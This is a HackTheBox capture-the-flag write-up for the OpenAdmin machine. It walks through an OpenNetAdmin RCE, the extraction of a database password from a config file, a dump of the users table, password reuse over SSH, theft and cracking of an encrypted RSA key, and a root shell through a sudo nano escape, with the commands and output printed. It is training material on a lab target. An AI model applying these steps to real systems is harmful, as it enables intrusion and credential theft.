---
Title: HackTheBox OpenAdmin
Date: 2020-01-09
Category: Challenges
Status: published
---

OpenAdmin is yet another medium-difficulty machine, which was a blast to hack on! It involved dealing with various stack components, such as interacting directly with a MySQL database. Furthermore, hopping across multiple users through different escalation vectors was very satisfying. Let's see how it is done!Our first nmap scan does not yield any exciting results:

```sh
$ nmap -sS -sC -oN openadmin.nmap -v 10.10.10.171
# Nmap 7.80 scan initiated Wed Jan  8 14:33:26 2020 as: nmap -sS -sC -oN openadmin.nmap -v 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jan  8 14:33:32 2020 -- 1 IP address (1 host up) scanned in 6.18 seconds
```

On port 80, we see the default Ubuntu Apache page. The server headers and error page leak the concrete version, but it is updated. Using dirbuster and a small directory wordlist, we find the `/music` and `/ona` endpoints. The first one hosts a custom web application without any exciting functionality. ONA is more attractive as it stands for [OpenNetAdmin](https://opennetadmin.com/). In the OpenNetAdmin interface, we are automatically logged in as a guest account. The user info panel leaks some database details, however. We get to know that MySQL is running on localhost, the default DB name is, and the default user is named `ona_sys`. We can also see the ONA version, which is `v18.1.1`. This is plenty of information to go on!We find that an [RCE is available](https://www.exploit-db.com/exploits/47691) for our version when we check for exploits. With some minor target-related updates to the proof-of-concept, we can drop into a shell right away and dump some user data:

```sh
# bash rce.sh http://10.10.10.171/ona/
$ whoami
www-data

$ cat /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

On the host, we can finally access the MySQL database:

```sh
$ mysql --version
mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper
```

We can find the credentials by simply browsing the local code. Inside `local/config/database_settings.inc.php`:

```php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

With the password in hand, let's show what databases we have:

```sh
$ mysql -u ona_sys -e "show databases;" -p'n1nj4W4rri0R!'
Database
information_schema
ona_default
```

In ona_default, we have a users table, which we can dump:

```sh
$ mysql -u ona_sys -e "use ona_default; select * from users;" -p'n1nj4W4rri0R!'
id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-01-09 19:55:04     2020-01-09 19:55:04
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
```

The passwords are MD5 hashes, which are so old that by now that we can perform a [rainbow table lookup](https://md5.gromweb.com/) online:

```
guest:test
admin:admin
```

With nothing more to check out server-side, we circle back and try out some SSH login with the credentials we have gathered so far. And indeed, `jimmy` has reused the database password `n1nj4W4rri0R!` for his SSH password. Logging in as jimmy, we gain access to `/var/www/internal`, where we find an exciting PHP file:

```sh
$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Posting the password from jimmy's SSH session here allows us to obtain the SSH key for `johanna`:

```sh
$ curl -F "username=jimmy" -F "password=n1nj4W4rri0R!" -X POST http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Back on our localhost, we can crack this key with `JohnTheRipper`:

```sh
➜  /usr/share/john/ssh2john.py id_rsa > id_rsa.john
➜  openadmin /usr/share/john/ssh2john.py joanna.key > joanna.hash
➜  openadmin john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:06 DONE (2020-01-08 17:50) 0.1440g/s 2066Kp/s 2066Kc/s 2066KC/sa6_123..*7¡Vamos!
Session completed
```


With the password `bloodninjas` in hand, we can log in as johanna through SSH:

```sh
ssh -i joanna.key joanna@10.10.10.171
```

This will give us access to the user flag. We check the sudo permissions for johanna:

```sh
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

With nano in the sudo permissions, we can efficiently perform a privilege escalation through it:

```sh
$ sudo /bin/nano /opt/priv
^R^X
reset; bash 1>&0 2>&0
```

We are now dropped into a root shell, securing the last flag. What a rollercoaster!
